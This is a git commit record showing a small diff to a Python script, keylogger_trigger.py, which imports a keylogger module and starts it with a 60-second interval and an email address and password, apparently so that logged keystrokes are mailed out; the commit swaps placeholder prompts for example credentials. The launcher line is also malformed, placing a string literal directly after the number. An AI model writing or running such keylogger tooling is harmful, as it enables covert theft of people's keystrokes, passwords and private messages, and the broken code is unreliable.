66a93c89d1330c0708cc692c071eb52a72b94ef1
illusionist42 <77529099+illusionist42@users.noreply.github.com>
2021-06-25 17:50:16 +0530

    Update keylogger_trigger.py

--- keylogger_trigger.py
+++ keylogger_trigger.py
@@ -1,5 +1,5 @@
 import keylogger
 
 
-my_keylogger = keylogger.Keylogger(60 """time in seconds""", "Enter your email Address (example@gmail.com)", "Enter your email address password (cool12345)" )
+my_keylogger = keylogger.Keylogger(60 """time in seconds""", "example@gmail.com", "cool12345" )
 my_keylogger.start()
